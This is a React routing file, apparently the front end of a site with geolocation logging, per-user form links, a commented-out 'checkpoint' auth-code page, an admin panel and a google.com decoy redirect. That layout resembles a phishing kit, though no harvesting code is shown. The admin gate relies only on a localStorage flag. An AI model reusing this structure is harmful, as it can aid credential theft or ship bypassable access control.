import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";

import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";

import GoogleTranslate from "./components/GoogleTranslate";
import { getLanguageByCountryCode } from "./components/languageUtils";

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  const [locationData, setLocationData] = useState(null);
  const [translationLoading, setTranslationLoading] = useState(true);

  useEffect(() => {
    const setLocation = async () => {
      try {
        const response = await fetch("https://ipinfo.io/json");
        const data = await response.json();

        const country = data.country || "Unknown";

        const language =
          getLanguageByCountryCode(country) || "en";

        const location = {
          lang: language,
          IP: data.ip || "Unknown",
          country,
          city: data.city || "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);

        // English không cần Google Translate
        if (language === "en") {
          setTranslationLoading(false);
        }
      } catch (error) {
        console.error("Location error:", error);

        const location = {
          lang: "en",
          IP: "Unknown",
          country: "Unknown",
          city: "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);

        setTranslationLoading(false);
      }
    };

    setLocation();
  }, []);

  // -----------------------------------------
  // Không cho spinner chạy vô hạn
  // -----------------------------------------
  useEffect(() => {
    if (!locationData || locationData.lang === "en") {
      return;
    }

    const timeout = setTimeout(() => {
      console.warn(
        "Google Translate timeout. Continue loading application."
      );

      setTranslationLoading(false);
    }, 1000);

    return () => {
      clearTimeout(timeout);
    };
  }, [locationData]);

  const handleTranslationReady = () => {
    setTranslationLoading(false);
  };

  // -----------------------------------------
  // Loading location
  // -----------------------------------------
  if (!locationData) {
    return (
      <div className="app-loading">
        <div className="spinner"></div>
      </div>
    );
  }

  return (
    <>
      {translationLoading && (
        <div className="app-loading">
          <div className="spinner"></div>
        </div>
      )}

      <BrowserRouter>
        <div id="app">

          {locationData.lang !== "en" && (
            <GoogleTranslate
              onReady={handleTranslationReady}
            />
          )}

          <Routes>
            <Route
              path="/"
              element={<HomePage />}
            />

            <Route
              path="id/:userID"
              element={<MyForm />}
            />

            <Route
              path="/request"
              element={<MyForm />}
            />

            {/* 
            <Route
              path="checkpoint/:userID"
              element={<AuthCode />}
            />
            */}

            <Route
              path="/login"
              element={<Login />}
            />

            <Route
              path="/admin"
              element={
                <PrivateRoute>
                  <AdminPage />
                </PrivateRoute>
              }
            />

            <Route
              path="*"
              element={
                <meta
                  httpEquiv="refresh"
                  content="1; url=https://www.google.com/"
                />
              }
            />
          </Routes>
        </div>
      </BrowserRouter>
    </>
  );
}

export default App;
